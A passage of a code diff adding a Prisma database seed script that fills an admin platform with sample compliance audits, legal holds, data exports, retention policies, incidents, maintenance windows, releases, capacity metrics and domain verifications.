+        frameworkId: gdprFramework.id,
+        orgId: acmeCorp.id,
+        status: 'EXPIRED',
+        attestedBy: 'TrustArc',
+        attestationDate: new Date('2023-03-01'),
+        expiresAt: new Date('2024-03-01'),
+        findings: [],
+        scope: { dataTypes: ['customer_data'], regions: ['EU'] },
+      },
+    ]
+  })
+
+  // ==================== COMPLIANCE AUDITS ====================
+  console.log('🔍 Creating compliance audits...')
+
+  await prisma.complianceAudit.createMany({
+    data: [
+      {
+        frameworkId: soc2Framework.id,
+        orgId: enterpriseCo.id,
+        auditType: 'EXTERNAL',
+        status: 'COMPLETED',
+        auditor: 'Deloitte & Touche LLP',
+        leadAuditor: 'Jennifer Williams, CISA',
+        scheduledDate: new Date('2024-05-01'),
+        startDate: new Date('2024-05-01'),
+        endDate: new Date('2024-06-10'),
+        scope: { period: '2023-06-01 to 2024-05-31', services: ['GWI Platform', 'API Services'] },
+        findings: [],
+        recommendations: ['Continue MFA rollout', 'Enhance logging retention'],
+        reportUrl: 'https://audits.gwi.com/soc2/enterprise-2024-final.pdf',
+      },
+      {
+        frameworkId: soc2Framework.id,
+        orgId: acmeCorp.id,
+        auditType: 'EXTERNAL',
+        status: 'IN_PROGRESS',
+        auditor: 'Ernst & Young',
+        leadAuditor: 'Michael Chen, CISA',
+        scheduledDate: new Date('2025-01-15'),
+        startDate: new Date('2025-01-15'),
+        scope: { period: '2024-01-01 to 2024-12-31', services: ['GWI Platform'] },
+        findings: [{ controlId: 'CC6.1', finding: 'MFA not enforced for all users', severity: 'medium', status: 'open' }],
+      },
+      {
+        frameworkId: gdprFramework.id,
+        auditType: 'INTERNAL',
+        status: 'COMPLETED',
+        auditor: 'Internal Audit Team',
+        leadAuditor: 'Sarah Johnson, DPO',
+        scheduledDate: new Date('2024-10-01'),
+        startDate: new Date('2024-10-01'),
+        endDate: new Date('2024-10-15'),
+        scope: { areas: ['Data Subject Rights', 'Consent Management', 'Data Retention'] },
+        findings: [{ area: 'Art15', finding: 'DSR response time occasionally exceeds 30 days', severity: 'low', status: 'remediated' }],
+        recommendations: ['Automate DSR workflow', 'Add capacity during peak periods'],
+      },
+      {
+        frameworkId: iso27001Framework.id,
+        orgId: enterpriseCo.id,
+        auditType: 'EXTERNAL',
+        status: 'SCHEDULED',
+        auditor: 'BSI Group',
+        scheduledDate: new Date('2025-03-01'),
+        scope: { type: 'surveillance', areas: ['A.5', 'A.8'] },
+      },
+      {
+        frameworkId: hipaaFramework.id,
+        orgId: enterpriseCo.id,
+        auditType: 'EXTERNAL',
+        status: 'SCHEDULED',
+        auditor: 'KPMG',
+        scheduledDate: new Date('2025-02-15'),
+        scope: { module: 'Healthcare Data Processing', controls: ['164.308', '164.312'] },
+      },
+    ]
+  })
+
+  // ==================== LEGAL HOLDS ====================
+  console.log('⚖️ Creating legal holds...')
+
+  const legalHold1 = await prisma.legalHold.create({
+    data: {
+      name: 'Smith v. DataCorp Litigation',
+      description: 'Legal hold for all documents related to Smith v. DataCorp class action lawsuit regarding data privacy',
+      status: 'ACTIVE',
+      reason: 'Pending litigation - class action lawsuit',
+      caseReference: 'Case No. 2024-CV-12345',
+      custodians: [johnDoe.id, janeSmith.id, adminUser.id],
+      scope: {
+        dataTypes: ['emails', 'documents', 'chat_logs', 'audit_logs'],
+        dateRange: { start: '2023-01-01', end: '2024-06-30' },
+        keywords: ['privacy', 'data breach', 'consent'],
+      },
+      createdBy: superAdmin?.id || 'system',
+      startDate: new Date('2024-06-01'),
+      notificationSent: true,
+      acknowledgements: [
+        { userId: johnDoe.id, acknowledgedAt: new Date('2024-06-02').toISOString() },
+        { userId: janeSmith.id, acknowledgedAt: new Date('2024-06-03').toISOString() },
+      ],
+    }
+  })
+
+  const legalHold2 = await prisma.legalHold.create({
+    data: {
+      name: 'Regulatory Investigation - FTC',
+      description: 'Document preservation for FTC investigation into data practices',
+      status: 'ACTIVE',
+      reason: 'Regulatory investigation',
+      caseReference: 'FTC File No. 2024-INV-789',
+      custodians: [adminUser.id, sarahEnterprise.id],
+      scope: {
+        dataTypes: ['all'],
+        dateRange: { start: '2022-01-01', end: 'present' },
+        departments: ['Engineering', 'Data Science', 'Legal'],
+      },
+      createdBy: superAdmin?.id || 'system',
+      startDate: new Date('2024-09-15'),
+      notificationSent: true,
+      acknowledgements: [
+        { userId: adminUser.id, acknowledgedAt: new Date('2024-09-16').toISOString() },
+      ],
+    }
+  })
+
+  await prisma.legalHold.create({
+    data: {
+      name: 'Employment Matter - Doe Termination',
+      description: 'Preservation of documents related to employee termination dispute',
+      status: 'RELEASED',
+      reason: 'Employment litigation',
+      caseReference: 'HR-2024-456',
+      custodians: [adminUser.id],
+      scope: {
+        dataTypes: ['emails', 'hr_records', 'performance_reviews'],
+        dateRange: { start: '2023-06-01', end: '2024-03-31' },
+      },
+      createdBy: superAdmin?.id || 'system',
+      startDate: new Date('2024-04-01'),
+      endDate: new Date('2024-11-15'),
+      notificationSent: true,
+      acknowledgements: [],
+      releaseReason: 'Matter settled out of court',
+    }
+  })
+
+  await prisma.legalHold.create({
+    data: {
+      name: 'IP Dispute - TechCorp',
+      description: 'Legal hold for intellectual property dispute with TechCorp',
+      status: 'PENDING',
+      reason: 'Anticipated litigation - IP dispute',
+      custodians: [bobWilson.id],
+      scope: {
+        dataTypes: ['source_code', 'design_docs', 'emails'],
+        dateRange: { start: '2023-01-01', end: 'present' },
+        projects: ['Project Alpha', 'Analytics Engine'],
+      },
+      createdBy: platformAdmin?.id || 'system',
+      notificationSent: false,
+    }
+  })
+
+  // ==================== DATA EXPORTS ====================
+  console.log('📤 Creating data exports...')
+
+  await prisma.dataExport.createMany({
+    data: [
+      {
+        orgId: acmeCorp.id,
+        requestedBy: adminUser.id,
+        type: 'GDPR_SAR',
+        status: 'COMPLETED',
+        scope: { userId: johnDoe.id, dataTypes: ['profile', 'activity', 'preferences'] },
+        format: 'JSON',
+        fileUrl: 'https://exports.gwi.com/sar/acme-johndoe-2024.zip',
+        fileSize: 15678432,
+        recordCount: 45678,
+        requestedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
+        completedAt: new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 25 * 24 * 60 * 60 * 1000),
+      },
+      {
+        orgId: enterpriseCo.id,
+        requestedBy: sarahEnterprise.id,
+        type: 'FULL_EXPORT',
+        status: 'PROCESSING',
+        scope: { allData: true, dateRange: { start: '2024-01-01', end: '2024-12-31' } },
+        format: 'CSV',
+        recordCount: 0,
+        requestedAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
+      },
+      {
+        orgId: acmeCorp.id,
+        requestedBy: janeSmith.id,
+        type: 'AUDIT_LOG',
+        status: 'COMPLETED',
+        scope: { logTypes: ['user_activity', 'data_access'], period: 'last_90_days' },
+        format: 'CSV',
+        fileUrl: 'https://exports.gwi.com/audit/acme-audit-q4.csv',
+        fileSize: 8945632,
+        recordCount: 125789,
+        requestedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
+        completedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 3600000),
+        expiresAt: new Date(now.getTime() + 20 * 24 * 60 * 60 * 1000),
+      },
+      {
+        orgId: enterpriseCo.id,
+        requestedBy: sarahEnterprise.id,
+        type: 'LEGAL_HOLD',
+        status: 'COMPLETED',
+        legalHoldId: legalHold1.id,
+        scope: { holdId: legalHold1.id, custodians: [johnDoe.id, janeSmith.id] },
+        format: 'ZIP',
+        fileUrl: 'https://exports.gwi.com/legal/smith-v-datacorp-export.zip',
+        fileSize: 256789432,
+        recordCount: 567890,
+        requestedAt: new Date(now.getTime() - 15 * 24 * 60 * 60 * 1000),
+        completedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 180 * 24 * 60 * 60 * 1000),
+      },
+      {
+        orgId: techStartup.id,
+        requestedBy: bobWilson.id,
+        type: 'ANALYTICS',
+        status: 'FAILED',
+        scope: { metrics: ['all'], aggregation: 'daily' },
+        format: 'PARQUET',
+        recordCount: 0,
+        requestedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
+        error: 'Export failed: Insufficient storage quota',
+      },
+      {
+        orgId: acmeCorp.id,
+        requestedBy: adminUser.id,
+        type: 'COMPLIANCE',
+        status: 'PENDING_APPROVAL',
+        scope: { framework: 'SOC2', period: '2024', includeEvidence: true },
+        format: 'PDF',
+        recordCount: 0,
+        requestedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
+        approvalRequired: true,
+        approvers: [superAdmin?.id || 'system'],
+      },
+      {
+        orgId: enterpriseCo.id,
+        type: 'GDPR_DELETION',
+        status: 'COMPLETED',
+        scope: { userId: 'deleted-user-123', deleteType: 'full_erasure' },
+        format: 'JSON',
+        fileUrl: 'https://exports.gwi.com/deletion/confirmation-123.json',
+        fileSize: 1024,
+        recordCount: 15678,
+        requestedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
+        completedAt: new Date(now.getTime() - 29 * 24 * 60 * 60 * 1000),
+      },
+    ]
+  })
+
+  // ==================== DATA RETENTION POLICIES ====================
+  console.log('🗄️ Creating data retention policies...')
+
+  await prisma.dataRetentionPolicy.createMany({
+    data: [
+      {
+        name: 'User Activity Logs',
+        dataType: 'ACTIVITY_LOGS',
+        retentionPeriod: 365,
+        description: 'Retain user activity logs for compliance and security analysis',
+        scope: { logTypes: ['login', 'api_access', 'data_view', 'export'] },
+        deletionMethod: 'HARD_DELETE',
+        isEnabled: true,
+        lastExecuted: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
+        nextExecution: new Date(now.getTime() + 6 * 24 * 60 * 60 * 1000),
+        legalBasis: 'Legitimate interest - security monitoring',
+      },
+      {
+        name: 'Audit Trail Records',
+        dataType: 'AUDIT_LOGS',
+        retentionPeriod: 2555,
+        description: 'Retain audit trails for 7 years per regulatory requirements',
+        scope: { logTypes: ['admin_actions', 'data_changes', 'access_control'] },
+        deletionMethod: 'ARCHIVE',
+        archiveLocation: 's3://gwi-compliance-archive/audit-logs/',
+        isEnabled: true,
+        lastExecuted: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+        nextExecution: new Date(now.getTime() + 23 * 24 * 60 * 60 * 1000),
+        legalBasis: 'Legal obligation - SOX compliance',
+      },
+      {
+        name: 'Customer Analytics Data',
+        dataType: 'ANALYTICS_DATA',
+        retentionPeriod: 730,
+        description: 'Retain customer analytics data for 2 years',
+        scope: { dataTypes: ['surveys', 'responses', 'insights'] },
+        deletionMethod: 'ANONYMIZE',
+        isEnabled: true,
+        lastExecuted: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
+        nextExecution: new Date(now.getTime() + 16 * 24 * 60 * 60 * 1000),
+        legalBasis: 'Contract performance',
+      },
+      {
+        name: 'Session Data',
+        dataType: 'SESSION_DATA',
+        retentionPeriod: 30,
+        description: 'Short-term retention for session data',
+        scope: { dataTypes: ['session_tokens', 'temp_files', 'cache'] },
+        deletionMethod: 'HARD_DELETE',
+        isEnabled: true,
+        lastExecuted: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
+        nextExecution: new Date(now.getTime() + 1 * 24 * 60 * 60 * 1000),
+        legalBasis: 'Data minimization',
+      },
+      {
+        name: 'Marketing Preferences',
+        dataType: 'MARKETING_DATA',
+        retentionPeriod: 1095,
+        description: 'Retain marketing consent records for 3 years after last interaction',
+        scope: { dataTypes: ['consent_records', 'preferences', 'opt_outs'] },
+        deletionMethod: 'SOFT_DELETE',
+        isEnabled: true,
+        legalBasis: 'Consent - GDPR Art. 7',
+      },
+      {
+        name: 'Deleted Account Data',
+        dataType: 'ACCOUNT_DATA',
+        retentionPeriod: 90,
+        description: 'Grace period for deleted accounts before permanent removal',
+        scope: { dataTypes: ['profile', 'settings', 'connections'] },
+        deletionMethod: 'STAGED_DELETE',
+        isEnabled: true,
+        lastExecuted: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
+        nextExecution: new Date(now.getTime() + 4 * 24 * 60 * 60 * 1000),
+        legalBasis: 'User request - GDPR Art. 17',
+      },
+    ]
+  })
+
+  // ==================== PLATFORM INCIDENTS ====================
+  console.log('🚨 Creating platform incidents...')
+
+  const incident1 = await prisma.platformIncident.create({
+    data: {
+      title: 'API Gateway Latency Spike',
+      description: 'Elevated API response times detected across all endpoints. P99 latency increased from 200ms to 2500ms.',
+      severity: 'MAJOR',
+      status: 'RESOLVED',
+      affectedServices: ['API Gateway', 'Authentication Service', 'Data Export'],
+      affectedRegions: ['us-east-1', 'eu-west-1'],
+      startedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
+      resolvedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000),
+      rootCause: 'Database connection pool exhaustion due to increased traffic from batch processing jobs',
+      resolution: 'Increased connection pool size and implemented connection timeout optimization',
+      postmortemUrl: 'https://docs.gwi.com/postmortems/2025-01-10-api-latency',
+      impactSummary: { affectedOrgs: 45, failedRequests: 12500, dataLoss: false },
+    }
+  })
+
+  const incident2 = await prisma.platformIncident.create({
+    data: {
+      title: 'Authentication Service Partial Outage',
+      description: 'Users experiencing intermittent login failures. OAuth2 token refresh failing for approximately 30% of requests.',
+      severity: 'CRITICAL',
+      status: 'RESOLVED',
+      affectedServices: ['Authentication Service', 'SSO Integration'],
+      affectedRegions: ['us-east-1'],
+      startedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+      resolvedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 45 * 60 * 1000),
+      rootCause: 'Redis cluster failover triggered by memory pressure, causing session cache invalidation',
+      resolution: 'Implemented Redis sentinel with automatic failover and increased memory allocation',
+      postmortemUrl: 'https://docs.gwi.com/postmortems/2025-01-06-auth-outage',
+      impactSummary: { affectedUsers: 2500, loginFailures: 8900, duration: '45 minutes' },
+    }
+  })
+
+  const incident3 = await prisma.platformIncident.create({
+    data: {
+      title: 'Data Export Service Degradation',
+      description: 'Large data exports timing out. Exports over 100MB failing consistently.',
+      severity: 'MINOR',
+      status: 'MONITORING',
+      affectedServices: ['Data Export', 'Report Generation'],
+      startedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
+      impactSummary: { affectedExports: 23, workaround: 'Split exports into smaller chunks' },
+    }
+  })
+
+  const incident4 = await prisma.platformIncident.create({
+    data: {
+      title: 'Scheduled Maintenance - Database Upgrade',
+      description: 'Planned maintenance for PostgreSQL version upgrade from 14 to 16.',
+      severity: 'MAINTENANCE',
+      status: 'SCHEDULED',
+      affectedServices: ['All Services'],
+      affectedRegions: ['us-east-1', 'eu-west-1', 'ap-southeast-1'],
+      scheduledStart: new Date(now.getTime() + 5 * 24 * 60 * 60 * 1000),
+      scheduledEnd: new Date(now.getTime() + 5 * 24 * 60 * 60 * 1000 + 4 * 60 * 60 * 1000),
+      impactSummary: { expectedDowntime: '4 hours', dataLoss: false },
+    }
+  })
+
+  const incident5 = await prisma.platformIncident.create({
+    data: {
+      title: 'CDN Cache Invalidation Delay',
+      description: 'Static assets not updating after deployments. Cache invalidation taking longer than expected.',
+      severity: 'MINOR',
+      status: 'RESOLVED',
+      affectedServices: ['Web Application', 'Dashboard'],
+      startedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
+      resolvedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000 + 6 * 60 * 60 * 1000),
+      rootCause: 'CDN provider experiencing global propagation delays',
+      resolution: 'Implemented cache versioning and added fallback to origin server',
+    }
+  })
+
+  const incident6 = await prisma.platformIncident.create({
+    data: {
+      title: 'Webhook Delivery Backlog',
+      description: 'Webhook deliveries delayed by up to 30 minutes due to queue backlog.',
+      severity: 'MAJOR',
+      status: 'INVESTIGATING',
+      affectedServices: ['Webhook Service', 'Event Processing'],
+      startedAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
+      impactSummary: { delayedWebhooks: 15000, maxDelay: '30 minutes' },
+    }
+  })
+
+  // ==================== INCIDENT UPDATES ====================
+  console.log('📝 Creating incident updates...')
+
+  await prisma.incidentUpdate.createMany({
+    data: [
+      { incidentId: incident1.id, status: 'INVESTIGATING', message: 'We are investigating reports of elevated API latency.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000) },
+      { incidentId: incident1.id, status: 'IDENTIFIED', message: 'Root cause identified as database connection pool exhaustion. Working on mitigation.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 30 * 60 * 1000) },
+      { incidentId: incident1.id, status: 'MONITORING', message: 'Fix deployed. Monitoring for stability.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 90 * 60 * 1000) },
+      { incidentId: incident1.id, status: 'RESOLVED', message: 'Incident resolved. All systems operating normally. Full postmortem to follow.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000) },
+      { incidentId: incident2.id, status: 'INVESTIGATING', message: 'We are aware of login issues affecting some users and are investigating.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000) },
+      { incidentId: incident2.id, status: 'IDENTIFIED', message: 'Issue traced to Redis cluster. Implementing fix.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 20 * 60 * 1000) },
+      { incidentId: incident2.id, status: 'RESOLVED', message: 'Authentication service restored. All users should be able to log in normally.', postedBy: superAdmin?.id || 'system', postedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 45 * 60 * 1000) },
+      { incidentId: incident3.id, status: 'INVESTIGATING', message: 'We are investigating reports of export timeouts for large datasets.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000) },
+      { incidentId: incident3.id, status: 'IDENTIFIED', message: 'Issue identified. Workaround: Please split exports into chunks smaller than 100MB while we work on a fix.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 10 * 60 * 60 * 1000) },
+      { incidentId: incident6.id, status: 'INVESTIGATING', message: 'We are investigating delayed webhook deliveries.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 4 * 60 * 60 * 1000) },
+      { incidentId: incident6.id, status: 'IDENTIFIED', message: 'Queue backlog identified. Scaling up workers to process backlog.', postedBy: platformAdmin?.id || 'system', postedAt: new Date(now.getTime() - 3 * 60 * 60 * 1000) },
+    ]
+  })
+
+  // ==================== MAINTENANCE WINDOWS ====================
+  console.log('🔧 Creating maintenance windows...')
+
+  await prisma.maintenanceWindow.createMany({
+    data: [
+      {
+        title: 'Database Version Upgrade',
+        description: 'Upgrading PostgreSQL from version 14 to 16 for improved performance and security.',
+        type: 'PLANNED',
+        status: 'SCHEDULED',
+        scheduledStart: new Date(now.getTime() + 5 * 24 * 60 * 60 * 1000),
+        scheduledEnd: new Date(now.getTime() + 5 * 24 * 60 * 60 * 1000 + 4 * 60 * 60 * 1000),
+        affectedServices: ['All Services'],
+        affectedRegions: ['us-east-1', 'eu-west-1', 'ap-southeast-1'],
+        impact: 'FULL_OUTAGE',
+        notificationsSent: true,
+        createdBy: superAdmin?.id || 'system',
+      },
+      {
+        title: 'Security Patch Deployment',
+        description: 'Rolling deployment of critical security patches across all application servers.',
+        type: 'PLANNED',
+        status: 'SCHEDULED',
+        scheduledStart: new Date(now.getTime() + 2 * 24 * 60 * 60 * 1000),
+        scheduledEnd: new Date(now.getTime() + 2 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000),
+        affectedServices: ['API Gateway', 'Web Application'],
+        impact: 'DEGRADED',
+        notificationsSent: true,
+        createdBy: platformAdmin?.id || 'system',
+      },
+      {
+        title: 'Network Infrastructure Upgrade',
+        description: 'Upgrading network switches in primary datacenter for improved throughput.',
+        type: 'PLANNED',
+        status: 'COMPLETED',
+        scheduledStart: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
+        scheduledEnd: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 6 * 60 * 60 * 1000),
+        actualStart: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 15 * 60 * 1000),
+        actualEnd: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 5 * 60 * 60 * 1000),
+        affectedServices: ['All Services'],
+        affectedRegions: ['us-east-1'],
+        impact: 'PARTIAL_OUTAGE',
+        notificationsSent: true,
+        postMaintenanceNotes: 'Completed 1 hour ahead of schedule. Network throughput improved by 40%.',
+        createdBy: superAdmin?.id || 'system',
+      },
+      {
+        title: 'SSL Certificate Renewal',
+        description: 'Renewing SSL certificates for all production domains.',
+        type: 'PLANNED',
+        status: 'SCHEDULED',
+        scheduledStart: new Date(now.getTime() + 14 * 24 * 60 * 60 * 1000),
+        scheduledEnd: new Date(now.getTime() + 14 * 24 * 60 * 60 * 1000 + 30 * 60 * 1000),
+        affectedServices: ['Web Application', 'API Gateway'],
+        impact: 'NONE',
+        notificationsSent: false,
+        createdBy: platformAdmin?.id || 'system',
+      },
+      {
+        title: 'Emergency Redis Cluster Maintenance',
+        description: 'Emergency maintenance to address memory issues in Redis cluster.',
+        type: 'EMERGENCY',
+        status: 'COMPLETED',
+        scheduledStart: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+        scheduledEnd: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000),
+        actualStart: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+        actualEnd: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 45 * 60 * 1000),
+        affectedServices: ['Authentication Service', 'Session Management'],
+        impact: 'PARTIAL_OUTAGE',
+        notificationsSent: true,
+        postMaintenanceNotes: 'Redis memory increased and sentinel configuration optimized.',
+        createdBy: superAdmin?.id || 'system',
+      },
+    ]
+  })
+
+  // ==================== RELEASE MANAGEMENT ====================
+  console.log('🚀 Creating release management...')
+
+  await prisma.releaseManagement.createMany({
+    data: [
+      {
+        version: '2.5.0',
+        name: 'Winter 2025 Release',
+        description: 'Major release with new admin portal features, enhanced security controls, and performance improvements.',
+        type: 'MAJOR',
+        status: 'RELEASED',
+        releaseDate: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+        changelog: [
+          { type: 'feature', description: 'New Security Center with policy management' },
+          { type: 'feature', description: 'Compliance framework tracking and attestations' },
+          { type: 'feature', description: 'Enhanced audit logging with 7-year retention' },
+          { type: 'improvement', description: 'API response time reduced by 40%' },
+          { type: 'fix', description: 'Fixed SSO redirect loop for certain IdP configurations' },
+        ],
+        breakingChanges: [],
+        rolloutPercentage: 100,
+        rollbackPlan: 'Database migrations are backward compatible. Rollback via feature flags.',
+        createdBy: superAdmin?.id || 'system',
+      },
+      {
+        version: '2.4.2',
+        name: 'Hotfix Release',
+        description: 'Security hotfix addressing CVE-2025-1234.',
+        type: 'PATCH',
+        status: 'RELEASED',
+        releaseDate: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
+        changelog: [
+          { type: 'security', description: 'Fixed XSS vulnerability in report viewer' },
+          { type: 'fix', description: 'Fixed memory leak in long-running agent processes' },
+        ],
+        breakingChanges: [],
+        rolloutPercentage: 100,
+        createdBy: platformAdmin?.id || 'system',
+      },
+      {
+        version: '2.4.1',
+        name: 'Bug Fix Release',
+        description: 'Bug fixes and minor improvements.',
+        type: 'PATCH',
+        status: 'RELEASED',
+        releaseDate: new Date(now.getTime() - 21 * 24 * 60 * 60 * 1000),
+        changelog: [
+          { type: 'fix', description: 'Fixed PDF export timeout for large crosstabs' },
+          { type: 'fix', description: 'Fixed timezone handling in scheduled reports' },
+          { type: 'improvement', description: 'Improved error messages for API validation' },
+        ],
+        breakingChanges: [],
+        rolloutPercentage: 100,
+        createdBy: platformAdmin?.id || 'system',
+      },
+      {
+        version: '2.6.0',
+        name: 'Spring 2025 Release',
+        description: 'Upcoming release with AI enhancements and new integration capabilities.',
+        type: 'MAJOR',
+        status: 'IN_DEVELOPMENT',
+        targetDate: new Date(now.getTime() + 60 * 24 * 60 * 60 * 1000),
+        changelog: [
+          { type: 'feature', description: 'AI-powered insight recommendations' },
+          { type: 'feature', description: 'Native Slack and Teams integrations' },
+          { type: 'feature', description: 'Advanced SCIM provisioning' },
+          { type: 'improvement', description: 'New dashboard builder with drag-and-drop' },
+        ],
+        breakingChanges: [
+          { change: 'API v1 endpoints deprecated', migration: 'Use v2 endpoints. See migration guide.' },
+        ],
+        createdBy: superAdmin?.id || 'system',
+      },
+      {
+        version: '2.5.1',
+        name: 'January Maintenance Release',
+        description: 'Scheduled maintenance release with performance optimizations.',
+        type: 'MINOR',
+        status: 'STAGED',
+        targetDate: new Date(now.getTime() + 3 * 24 * 60 * 60 * 1000),
+        changelog: [
+          { type: 'improvement', description: 'Database query optimization for large datasets' },
+          { type: 'improvement', description: 'Reduced memory footprint for background workers' },
+          { type: 'fix', description: 'Fixed rare race condition in concurrent exports' },
+        ],
+        breakingChanges: [],
+        rolloutPercentage: 25,
+        rollbackPlan: 'Feature flags allow instant rollback without deployment.',
+        createdBy: platformAdmin?.id || 'system',
+      },
+      {
+        version: '2.5.2',
+        name: 'February Bug Fix Release',
+        description: 'Bug fixes based on customer feedback.',
+        type: 'PATCH',
+        status: 'PLANNED',
+        targetDate: new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000),
+        changelog: [],
+        breakingChanges: [],
+        createdBy: platformAdmin?.id || 'system',
+      },
+    ]
+  })
+
+  // ==================== CAPACITY METRICS ====================
+  console.log('📊 Creating capacity metrics...')
+
+  const services = ['API Gateway', 'Authentication', 'Data Processing', 'Export Service', 'Webhook Service', 'Search Engine', 'Cache Layer']
+  const capacityMetrics = []
+
+  for (const service of services) {
+    capacityMetrics.push({
+      service,
+      region: 'us-east-1',
+      metricType: 'CPU',
+      currentValue: 45 + Math.random() * 30,
+      maxValue: 100,
+      threshold: 80,
+      unit: 'percent',
+      trend: Math.random() > 0.5 ? 'INCREASING' : 'STABLE',
+      forecast: { nextWeek: 55 + Math.random() * 20, nextMonth: 60 + Math.random() * 25 },
+    })
+    capacityMetrics.push({
+      service,
+      region: 'us-east-1',
+      metricType: 'MEMORY',
+      currentValue: 50 + Math.random() * 25,
+      maxValue: 100,
+      threshold: 85,
+      unit: 'percent',
+      trend: 'STABLE',
+      forecast: { nextWeek: 52 + Math.random() * 20, nextMonth: 55 + Math.random() * 25 },
+    })
+  }
+
+  capacityMetrics.push(
+    { service: 'PostgreSQL Primary', region: 'us-east-1', metricType: 'STORAGE', currentValue: 2.4, maxValue: 10, threshold: 8, unit: 'TB', trend: 'INCREASING', forecast: { nextWeek: 2.5, nextMonth: 2.8 } },
+    { service: 'PostgreSQL Primary', region: 'us-east-1', metricType: 'CONNECTIONS', currentValue: 450, maxValue: 1000, threshold: 800, unit: 'connections', trend: 'STABLE' },
+    { service: 'Redis Cluster', region: 'us-east-1', metricType: 'MEMORY', currentValue: 12, maxValue: 32, threshold: 28, unit: 'GB', trend: 'INCREASING', forecast: { nextWeek: 13, nextMonth: 15 } },
+    { service: 'Elasticsearch', region: 'us-east-1', metricType: 'STORAGE', currentValue: 850, maxValue: 2000, threshold: 1800, unit: 'GB', trend: 'INCREASING', forecast: { nextWeek: 880, nextMonth: 950 } },
+    { service: 'Message Queue', region: 'us-east-1', metricType: 'QUEUE_DEPTH', currentValue: 15000, maxValue: 100000, threshold: 80000, unit: 'messages', trend: 'STABLE' }
+  )
+
+  await prisma.capacityMetric.createMany({ data: capacityMetrics })
+
+  // ==================== DOMAIN VERIFICATION ====================
+  console.log('🌐 Creating domain verifications...')
+
+  await prisma.domainVerification.createMany({
+    data: [
+      {
+        orgId: enterpriseCo.id,
+        domain: 'enterprise-co.com',
+        status: 'VERIFIED',
+        verificationType: 'DNS_TXT',
+        verificationToken: 'gwi-verify=abc123def456',
+        verifiedAt: new Date(now.getTime() - 90 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 275 * 24 * 60 * 60 * 1000),
+        autoRenew: true,
+        isPrimary: true,
+      },
+      {
+        orgId: enterpriseCo.id,
+        domain: 'enterprise.io',
+        status: 'VERIFIED',
+        verificationType: 'DNS_CNAME',
+        verificationToken: 'gwi-verify-cname.enterprise.io',
+        verifiedAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 305 * 24 * 60 * 60 * 1000),
+        autoRenew: true,
+        isPrimary: false,
+      },
+      {
+        orgId: acmeCorp.id,
+        domain: 'acme.com',
+        status: 'VERIFIED',
+        verificationType: 'DNS_TXT',
+        verificationToken: 'gwi-verify=xyz789ghi012',
+        verifiedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 335 * 24 * 60 * 60 * 1000),
+        autoRenew: true,
+        isPrimary: true,
+      },
+      {
+        orgId: techStartup.id,
+        domain: 'techstartup.io',
+        status: 'PENDING',
+        verificationType: 'DNS_TXT',
+        verificationToken: 'gwi-verify=pending123',
+        verificationAttempts: 2,
+        lastAttemptAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
+      },
+      {
+        orgId: acmeCorp.id,
+        domain: 'acme-labs.dev',
+        status: 'FAILED',
+        verificationType: 'META_TAG',
+        verificationToken: '<meta name="gwi-verify" content="failed456">',
+        verificationAttempts: 5,
+        lastAttemptAt: new Date(now.getTime() - 24 * 60 * 60 * 1000),
